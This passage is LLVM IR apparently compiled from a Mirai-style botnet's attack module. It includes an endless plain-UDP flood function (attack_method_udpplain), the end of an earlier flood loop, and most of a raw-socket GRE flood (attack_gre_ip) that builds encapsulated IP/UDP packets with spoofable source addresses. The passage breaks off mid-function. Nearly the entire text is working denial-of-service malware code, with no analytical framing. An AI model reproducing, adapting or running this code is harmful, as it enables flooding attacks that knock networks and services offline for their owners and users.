  store %struct.sockaddr* %280, %struct.sockaddr** %274, align 8
  %281 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %282 = load %struct.sockaddr*, %struct.sockaddr** %281, align 8
  %283 = call i64 @sendto(i32 noundef %269, i8* noundef %270, i64 noundef %273, i32 noundef 16384, %struct.sockaddr* %282, i32 noundef 16)
  br label %284

284:                                              ; preds = %237
  %285 = load i32, i32* %9, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %9, align 4
  br label %165, !llvm.loop !26

287:                                              ; preds = %165
  br label %164

288:                                              ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpplain(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #8
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #8
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #9
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #8
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #9
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #8
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #8
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #9
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #9
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !27

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !28

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_gre_ip(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 noundef %34, i64 noundef 8) #8
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 noundef zeroext %37, %struct.attack_option* noundef %38, i8 noundef zeroext 2, i32 noundef 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 3, i32 noundef 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 4, i32 noundef 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 5, i32 noundef 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 6, i32 noundef 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 7, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 1, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 19, i32 noundef 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 25, i32 noundef 100)
  store i32 %74, i32* %21, align 4
  %75 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #8
  store i32 %75, i32* %10, align 4
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %78

77:                                               ; preds = %4
  br label %432

78:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 noundef %79, i32 noundef 0, i32 noundef 3, i8* noundef %80, i32 noundef 4) #8
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %86

83:                                               ; preds = %78
  %84 = load i32, i32* %10, align 4
  %85 = call i32 @close(i32 noundef %84)
  br label %432

86:                                               ; preds = %78
  store i32 0, i32* %9, align 4
  br label %87

87:                                               ; preds = %237, %86
  %88 = load i32, i32* %9, align 4
  %89 = load i8, i8* %5, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp slt i32 %88, %90
  br i1 %91, label %92, label %240

92:                                               ; preds = %87
  %93 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #8
  %94 = load i8**, i8*** %11, align 8
  %95 = load i32, i32* %9, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8*, i8** %94, i64 %96
  store i8* %93, i8** %97, align 8
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  %102 = load i8*, i8** %101, align 8
  %103 = bitcast i8* %102 to %struct.iphdr*
  store %struct.iphdr* %103, %struct.iphdr** %22, align 8
  %104 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i64 1
  %106 = bitcast %struct.iphdr* %105 to %struct.grehdr*
  store %struct.grehdr* %106, %struct.grehdr** %23, align 8
  %107 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %108 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %107, i64 1
  %109 = bitcast %struct.grehdr* %108 to %struct.iphdr*
  store %struct.iphdr* %109, %struct.iphdr** %24, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.udphdr*
  store %struct.udphdr* %112, %struct.udphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, -16
  %122 = or i8 %121, 5
  store i8 %122, i8* %119, align 4
  %123 = load i8, i8* %12, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 1
  store i8 %123, i8* %125, align 1
  %126 = load i32, i32* %18, align 4
  %127 = sext i32 %126 to i64
  %128 = add i64 52, %127
  %129 = trunc i64 %128 to i16
  %130 = call zeroext i16 @htons(i16 noundef zeroext %129) #9
  %131 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 2
  store i16 %130, i16* %132, align 2
  %133 = load i16, i16* %13, align 2
  %134 = call zeroext i16 @htons(i16 noundef zeroext %133) #9
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 3
  store i16 %134, i16* %136, align 4
  %137 = load i8, i8* %14, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 5
  store i8 %137, i8* %139, align 4
  %140 = load i8, i8* %15, align 1
  %141 = icmp ne i8 %140, 0
  br i1 %141, label %142, label %146

142:                                              ; preds = %92
  %143 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %144 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i16 %143, i16* %145, align 2
  br label %146

146:                                              ; preds = %142, %92
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 47, i8* %148, align 1
  %149 = load i32, i32* %21, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  store i32 %149, i32* %151, align 4
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 9
  store i32 %157, i32* %159, align 4
  %160 = call zeroext i16 @htons(i16 noundef zeroext 2048) #9
  %161 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %162 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %161, i32 0, i32 1
  store i16 %160, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = load i8, i8* %164, align 4
  %166 = and i8 %165, 15
  %167 = or i8 %166, 64
  store i8 %167, i8* %164, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, -16
  %172 = or i8 %171, 5
  store i8 %172, i8* %169, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = load i32, i32* %18, align 4
  %177 = sext i32 %176 to i64
  %178 = add i64 28, %177
  %179 = trunc i64 %178 to i16
  %180 = call zeroext i16 @htons(i16 noundef zeroext %179) #9
  %181 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  store i16 %180, i16* %182, align 2
  %183 = load i16, i16* %13, align 2
  %184 = zext i16 %183 to i32
  %185 = xor i32 %184, -1
  %186 = trunc i32 %185 to i16
  %187 = call zeroext i16 @htons(i16 noundef zeroext %186) #9
  %188 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 3
  store i16 %187, i16* %189, align 4
  %190 = load i8, i8* %14, align 1
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 5
  store i8 %190, i8* %192, align 4
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

195:                                              ; preds = %146
  %196 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %197 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 4
  store i16 %196, i16* %198, align 2
  br label %199

199:                                              ; preds = %195, %146
  %200 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 6
  store i8 17, i8* %201, align 1
  %202 = call i32 @rand_next()
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 8
  store i32 %202, i32* %204, align 4
  %205 = load i8, i8* %20, align 1
  %206 = icmp ne i8 %205, 0
  br i1 %206, label %207, label %213

207:                                              ; preds = %199
  %208 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  %210 = load i32, i32* %209, align 4
  %211 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 9
  store i32 %210, i32* %212, align 4
  br label %221

213:                                              ; preds = %199
  %214 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 8
  %216 = load i32, i32* %215, align 4
  %217 = sub i32 %216, 1024
  %218 = xor i32 %217, -1
  %219 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 9
  store i32 %218, i32* %220, align 4
  br label %221

221:                                              ; preds = %213, %207
  %222 = load i16, i16* %16, align 2
  %223 = call zeroext i16 @htons(i16 noundef zeroext %222) #9
  %224 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 2
  %226 = load i16, i16* %17, align 2
  %227 = call zeroext i16 @htons(i16 noundef zeroext %226) #9
  %228 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i32, i32* %18, align 4
  %231 = sext i32 %230 to i64
  %232 = add i64 8, %231
  %233 = trunc i64 %232 to i16
  %234 = call zeroext i16 @htons(i16 noundef zeroext %233) #9
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 2
  store i16 %234, i16* %236, align 2
  br label %237

237:                                              ; preds = %221
  %238 = load i32, i32* %9, align 4
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %9, align 4
  br label %87, !llvm.loop !29

240:                                              ; preds = %87
  br label %241

241:                                              ; preds = %431, %240
  store i32 0, i32* %9, align 4
  br label %242

242:                                              ; preds = %428, %241
  %243 = load i32, i32* %9, align 4
  %244 = load i8, i8* %5, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp slt i32 %243, %245
  br i1 %246, label %247, label %431

247:                                              ; preds = %242
  %248 = load i8**, i8*** %11, align 8
  %249 = load i32, i32* %9, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i8*, i8** %248, i64 %250
  %252 = load i8*, i8** %251, align 8
  store i8* %252, i8** %26, align 8
  %253 = load i8*, i8** %26, align 8
  %254 = bitcast i8* %253 to %struct.iphdr*
  store %struct.iphdr* %254, %struct.iphdr** %27, align 8
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i64 1
  %257 = bitcast %struct.iphdr* %256 to %struct.grehdr*
  store %struct.grehdr* %257, %struct.grehdr** %28, align 8
  %258 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %259 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %258, i64 1
  %260 = bitcast %struct.grehdr* %259 to %struct.iphdr*
  store %struct.iphdr* %260, %struct.iphdr** %29, align 8
  %261 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i64 1
  %263 = bitcast %struct.iphdr* %262 to %struct.udphdr*
  store %struct.udphdr* %263, %struct.udphdr** %30, align 8
  %264 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %265 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %264, i64 1
  %266 = bitcast %struct.udphdr* %265 to i8*
  store i8* %266, i8** %31, align 8
  %267 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %268 = load i32, i32* %9, align 4
  %269 = sext i32 %268 to i64
